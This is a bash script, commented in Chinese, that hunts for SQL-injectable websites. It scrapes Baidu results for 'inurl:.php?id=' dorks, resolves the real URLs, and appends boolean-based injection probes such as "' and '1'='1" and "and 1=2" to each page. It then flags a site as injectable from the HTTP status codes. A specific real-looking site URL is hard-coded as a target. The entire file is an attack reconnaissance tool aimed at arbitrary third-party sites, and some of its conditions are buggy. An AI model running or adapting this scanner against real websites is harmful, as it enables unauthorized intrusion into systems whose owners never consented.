#!/bin/bash

#sql注入检测参数
sql_com1="%27"											#	"'"		#异常
sql_com2="%27%20and%20%271%27=%271"						#   "' and '1'='1"			#正常
sql_com3="%27%20and%20%271%27=%272"						#	"' and '1'='2"			#异常
sql_com4="%20and%201=1"									#	" and 1=1"			#正常
sql_com5="%20and%201=2"									#	" and 1=2"			#异常

search_wd="inurl:%22.php?id=%22"						#"inurl:\".php?id=\""
#search_wd="inurl:%22.asp?id=%22"							"inurl:\".asp?id=\""
sql_url="http://www.yzftx.com.cn/newscontent.asp?id=42"
sql_www=""
dist_url=""

#从一个网站搜索注入点
get_site()
{
	html_site=`curl "$sql_www"`
}

#制定sql注入点
get_url()
{
	dist_url="$sql_url"
}

#从百度搜索获取关键字的搜索结果网址，http
baidu_search()
{
	curl -k -s https://www.baidu.com/s?wd="$search_wd" > temp.txt
	start_line=`cat temp.txt | sed "s/<[^>]*>//g" | grep -n "百度为您" | cut -f1 -d":"`
	end_line=`cat temp.txt | sed "s/<[^>]*>//g" | grep -n "帮助" | cut -f1 -d":"`
	text=`cat temp.txt | sed "s/<[^>]*>//g" | head -n $end_line | tail -n +$start_line`
	echo $text > temp.txt
	dist_url=`grep -o -E "http://www.baidu.com/link?[^\"]*" temp.txt`
	echo $dist_url
}

#sql注入点检测，使用百度
sql_tool_baidu()
{
	for url1 in $dist_url
	do
		#echo $url1
		#将http转换为https
		url2=`echo $url1 | sed "s/http/https/g" `
		#echo $url2
		#用百度https地址解析出真实地址
		url3=`curl -k -i -s $url2 | grep "Location" | awk '{print $2}'`
		#echo $url3
		server_type=`curl -i -s $url3 | grep "Server:" | awk '{print $2}'`
		#打印网址和服务器类型
		#echo "$url3                $server_type"
		url4="$url3$sql_com1"
		echo $url4
		err1=`curl -i -s "$url4" | grep "HTTP/1.1" | awk '{print $2}'`
		url5="$url2$sql_com2"
		err2=`curl -i -s "$url5" | grep "HTTP/1.1" | awk '{print $2}'`
		url6="$url2$sql_com3"
		err3=`curl -i -s "$url6" | grep "HTTP/1.1" | awk '{print $2}'`
		url7="$url2$sql_com4"
		err4=`curl -i -s "$url7" | grep "HTTP/1.1" | awk '{print $2}'`
		url8="$url2$sql_com5"
		err5=`curl -i -s "$url8" | grep "HTTP/1.1" | awk '{print $2}'`
		#echo "$url2'"
		#echo "$url2' and '1'='1"
		#echo "$url2' and '1'='2"
		#echo "$url2 and 1=1"
		#echo "$url2 and 1=2"
		#echo "$err1   $err2   $err3    $err4   $err5"
		if	[[ "$err1" != "200" && "$err2" == "200" && "$err1" != "200" ]];then
			echo "$url2    ok"
		elif	[[ "$err4" == "200" && "$err2" != "200" ]];then
			echo "$url2    ok"
		else
			echo "$url2    no"
		fi
	done
}

#检测某个网站是否存在sql注入
sql_tool_url()
{
	for url1 in $dist_url
	do
		#echo $url1
		url2=`echo $url1`
		#echo $url2
		server_type=`curl -i -s $url2 | grep "Server:" | awk '{print $2}'`
		#打印网址和服务器类型
		#echo "$url2                $server_type"
		url4="$url2$sql_com1"
		err1=`curl -i -s "$url4" | grep "HTTP/1.1" | awk '{print $2}'`
		url5="$url2$sql_com2"
		err2=`curl -i -s "$url5" | grep "HTTP/1.1" | awk '{print $2}'`
		url6="$url2$sql_com3"
		err3=`curl -i -s "$url6" | grep "HTTP/1.1" | awk '{print $2}'`
		url7="$url2$sql_com4"
		err4=`curl -i -s "$url7" | grep "HTTP/1.1" | awk '{print $2}'`
		url8="$url2$sql_com5"
		err5=`curl -i -s "$url8" | grep "HTTP/1.1" | awk '{print $2}'`
		#echo "$url2'"
		#echo "$url2' and '1'='1"
		#echo "$url2' and '1'='2"
		#echo "$url2 and 1=1"
		#echo "$url2 and 1=2"
		#echo "$err1   $err2   $err3    $err4   $err5"
		if	[[ "$err1" != "200" && "$err2" == "200" && "$err1" != "200" ]];then
			echo "$url2    ok"
		elif	[[ "$err4" == "200" && "$err2" != "200" ]];then
			echo "$url2    ok"
		else
			echo "$url2    no"
		fi
	done
}


main()
{
	baidu_search
	#get_url
	sql_tool_baidu
	#sql_tool_url
}

main
